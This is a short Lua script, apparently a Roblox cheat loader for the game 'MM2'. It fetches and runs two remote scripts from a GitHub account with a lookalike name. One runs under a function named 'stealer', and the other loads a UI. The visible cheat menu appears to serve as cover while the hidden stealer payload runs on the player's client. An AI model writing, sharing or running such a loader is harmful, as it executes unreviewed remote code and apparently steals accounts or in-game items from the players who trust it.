local function stealer()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/file.lua"))()
end
local function loadui()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/script.lua"))()
end

task.spawn(stealer)
task.spawn(loadui)
